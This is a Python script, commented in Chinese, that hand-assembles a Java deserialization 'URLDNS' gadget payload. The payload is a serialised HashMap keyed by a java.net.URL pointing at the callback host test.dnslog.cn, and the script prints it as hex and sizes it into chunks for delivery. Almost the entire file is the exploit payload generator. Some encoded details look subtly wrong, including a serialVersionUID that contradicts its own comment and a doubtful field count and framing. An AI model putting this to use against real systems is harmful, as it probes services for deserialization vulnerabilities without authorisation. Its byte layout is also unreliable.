#!/usr/bin/env python3
"""测试和生成 URLDNS payload"""
import struct

def create_urldns_payload(callback_url):
    """创建 URLDNS payload"""
    payload = bytearray()
    
    # Stream header
    payload += b'\xac\xed\x00\x05'
    
    # TC_OBJECT
    payload += b'\x73'
    
    # TC_CLASSDESC for java.util.HashMap
    payload += b'\x72'
    payload += struct.pack('>H', 17)  # name length
    payload += b'java.util.HashMap'
    # serialVersionUID for HashMap
    uid_hashmap = 362498820763181265  # 0x0507dac1c31660d1
    payload += struct.pack('>q', uid_hashmap)
    payload += b'\x03'  # SC_WRITE_METHOD | SC_SERIALIZABLE
    payload += struct.pack('>H', 2)  # field count
    
    # Field: float loadFactor
    payload += b'F'
    payload += struct.pack('>H', 10)
    payload += b'loadFactor'
    
    # Field: int threshold
    payload += b'I'
    payload += struct.pack('>H', 9)
    payload += b'threshold'
    
    # TC_ENDBLOCKDATA + TC_NULL (no superclass)
    payload += b'\x78\x70'
    
    # Field values
    payload += struct.pack('>f', 0.75)  # loadFactor
    payload += struct.pack('>i', 0)  # threshold
    
    # writeObject data: buckets, size, entries
    payload += struct.pack('>i', 16)  # bucket count
    payload += struct.pack('>i', 1)  # size
    
    # Entry key: java.net.URL
    payload += b'\x73'  # TC_OBJECT
    payload += b'\x72'  # TC_CLASSDESC
    payload += struct.pack('>H', 12)  # name length
    payload += b'java.net.URL'
    # serialVersionUID for URL: -7627629684871044847 (0x962537361afce472 as signed)
    uid_url = -7627629684871044846
    payload += struct.pack('>q', uid_url)
    payload += b'\x03'  # SC_WRITE_METHOD | SC_SERIALIZABLE
    payload += struct.pack('>H', 7)  # field count
    
    # URL fields
    payload += b'I' + struct.pack('>H', 8) + b'hashCode'
    payload += b'I' + struct.pack('>H', 4) + b'port'
    
    # Object type fields
    fields = [
        (b'authority', b'Ljava/lang/String;'),
        (b'file', b'Ljava/lang/String;'),
        (b'host', b'Ljava/lang/String;'),
        (b'protocol', b'Ljava/lang/String;'),
        (b'ref', b'Ljava/lang/String;'),
    ]
    for name, sig in fields:
        payload += b'L'
        payload += struct.pack('>H', len(name))
        payload += name
        payload += b'\x74'  # TC_STRING
        payload += struct.pack('>H', len(sig))
        payload += sig
    
    # TC_ENDBLOCKDATA + TC_NULL
    payload += b'\x78\x70'
    
    # URL field values
    payload += struct.pack('>i', -1)  # hashCode (unset)
    payload += struct.pack('>i', -1)  # port (unset)
    
    # Parse callback URL
    host = callback_url.replace('http://', '').replace('https://', '').rstrip('/')
    
    # String fields: authority, file, host, protocol, ref
    strings = [host, '/', host, 'http', None]
    for s in strings:
        if s is None:
            payload += b'\x70'  # TC_NULL
        else:
            payload += b'\x74'  # TC_STRING
            payload += struct.pack('>H', len(s))
            payload += s.encode('utf-8')
    
    # URL.writeObject block data end
    payload += b'\x78'  # TC_ENDBLOCKDATA
    
    # Entry value: reference to same URL object
    payload += b'\x71'  # TC_REFERENCE
    payload += struct.pack('>i', 0x7e0003)  # handle to URL object
    
    # HashMap.writeObject block data end
    payload += b'\x78'  # TC_ENDBLOCKDATA
    
    return bytes(payload)


if __name__ == '__main__':
    p = create_urldns_payload('http://test.dnslog.cn')
    print(f'Payload size: {len(p)} bytes')
    print(f'Hex: {p.hex()}')
    print()
    
    # Verify
    assert p[:4] == b'\xac\xed\x00\x05'
    print('Header OK')
    
    # 计算分块
    # 第一块: stream header (4) + blockdata 指令
    # 后续: 6 字节 payload + 2 字节 blockdata
    remaining = len(p) - 4
    chunks = 1 + (remaining + 5) // 6
    print(f'Payload without header: {remaining} bytes')
    print(f'Chunks needed: {chunks}')
    print(f'Total data written: {chunks * 20} bytes')
